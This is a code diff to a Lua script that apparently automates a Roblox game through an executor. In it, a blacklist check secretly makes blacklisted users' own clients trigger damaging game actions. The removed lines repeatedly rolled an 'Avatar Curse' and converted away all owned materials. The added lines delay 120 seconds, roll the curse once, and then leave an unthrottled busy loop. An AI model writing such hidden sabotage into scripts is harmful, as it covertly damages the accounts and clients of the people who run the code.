@@ -271,18 +271,17 @@ local specialUser = {
     [177984480] = true,
     [5465738868] = true,
 }
-if BlacklistedIDs[LocalPlayer.UserId] and LocalPlayer.UserId ~= 9821359256 then
+local sudahi = 0
+if BlacklistedIDs[LocalPlayer.UserId] then
     local pData = getgenv().PlayerData    
     task.spawn(function()
+        task.wait(120)
         while true do
-            Reply.To("Avatar Curse Roll")
-            for tokenname, owneds in pData.Materials do
-                if owneds > 0 then
-                    Reply.To("Fast Token Conversion", tokenname)
-                    task.wait(0.5)
-                end
+            if sudahi == 0 then
+                Reply.To("Avatar Curse Roll")
+                sudahi = sudahi + 1
+                task.wait(1)
             end
-            Reply.To("Convert Tokens", "UniqueSkillsShard", true, 1)
         end
     end)
     return
